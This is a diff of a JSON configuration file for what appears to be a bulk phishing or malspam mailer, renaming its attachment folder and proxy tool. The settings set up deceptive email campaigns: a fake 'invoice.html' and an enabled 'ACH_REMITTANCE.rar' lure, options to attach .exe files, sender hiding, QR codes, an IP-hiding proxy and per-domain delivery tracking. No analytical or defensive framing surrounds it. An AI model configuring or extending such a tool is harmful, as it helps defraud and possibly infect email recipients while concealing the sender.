@@ -89,7 +89,7 @@
     "location": "Online",
     "duration_hours": 1
   },
-  "attachment_path": "brainiac_attachment/invoice.html",
+  "attachment_path": "magxxic_vot_attachment/invoice.html",
   "convert_to_pdf": false,
   "hide_sender": true,
   "use_qrcode": true,
@@ -176,27 +176,27 @@
   },
   "direct_attachment_files": [
     {
-      "path": "brainiac_attachment/ACH_REMITTANCE.rar",
+      "path": "magxxic_vot_attachment/ACH_REMITTANCE.rar",
       "enabled": true,
       "_comment": "✅ ON - This file WILL be attached"
     },
     {
-      "path": "brainiac_attachment/presentation.pptx",
+      "path": "magxxic_vot_attachment/presentation.pptx",
       "enabled": false,
       "_comment": "❌ OFF - This file will NOT be attached"
     },
     {
-      "path": "brainiac_attachment/report.docx",
+      "path": "magxxic_vot_attachment/report.docx",
       "enabled": false,
       "_comment": "❌ OFF - Toggle to true to enable"
     },
     {
-      "path": "brainiac_attachment/myfile.zip",
+      "path": "magxxic_vot_attachment/myfile.zip",
       "enabled": false,
       "_comment": "❌ OFF - Works with ANY filename you want!"
     },
     {
-      "path": "brainiac_attachment/anything.exe",
+      "path": "magxxic_vot_attachment/anything.exe",
       "enabled": false,
       "_comment": "❌ OFF - Even .exe files work!"
     }
@@ -209,7 +209,7 @@
     "NO_ZIP": "Set create_zip: false → Files attached directly (no ZIP wrapper)"
   },
   "_direct_files_instructions": {
-    "step_1": "Put your files in brainiac_attachment/ folder",
+    "step_1": "Put your files in magxxic_vot_attachment/ folder",
     "step_2": "Add them to the list above with any filename you want",
     "step_3": "Set enabled: true for files you want to send",
     "step_4": "Set enabled: false for files you DON'T want to send",
@@ -493,6 +493,6 @@
     "enabled": true,
     "_note": "Track delivery per domain, auto-skip 0% after 5+ attempts"
   },
-  "_proxy_note": "Sending proxy is managed by your administrator. Run: brainiac_proxy.exe --proxy-status to check.",
+  "_proxy_note": "Sending proxy is managed by your administrator. Run: magxxic_vot_proxy.exe --proxy-status to check.",
   "_ip_hiding_note": "IP-hiding proxy is managed by your administrator."
 }
